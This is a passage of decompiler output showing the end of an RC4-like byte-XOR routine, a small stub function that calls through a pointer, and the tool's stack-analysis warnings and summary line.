    *a1 ^= *(_BYTE *)(a3 + (unsigned __int8)(*(_BYTE *)(a3 + v7) + *(_BYTE *)(a3 + v4)));
    ++i;
  }
  *(_BYTE *)(a3 + 256) = v4;
  result = v7;
  *(_BYTE *)(a3 + 257) = v7;
  return result;
}

//----- (0040895D) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_40895D@<eax>(int a1@<edx>, char a2@<bh>)
{
  *(_BYTE *)(a1 + 3608) += a2;
  return ((int (*)(void))unk_40A098)();
}
// 408969: positive sp value 4 has been found
// 40895D: could not find valid save-restore pair for ebx

// nfuncs=43 queued=43 decompiled=43 lumina nreq=0 worse=0 better=0
// ALL OK, 43 function(s) have been successfully decompiled
